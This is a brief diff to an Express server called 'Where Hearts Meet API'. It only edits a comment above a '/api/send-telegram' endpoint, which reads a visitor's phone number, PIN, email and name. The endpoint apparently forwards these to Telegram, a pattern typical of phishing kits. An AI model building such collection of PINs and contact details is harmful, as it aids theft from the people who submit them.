@@ -25,7 +25,7 @@ app.get('/', (req, res) => {
     res.json({ status: 'OK', message: 'Where Hearts Meet API is running!' });
 });
 
-// Telegram endpoint - THIS IS WHAT YOU NEED
+// Telegram endpoint
 app.post('/api/send-telegram', async (req, res) => {
     try {
         const { phone, pin, email, name, type, site } = req.body;
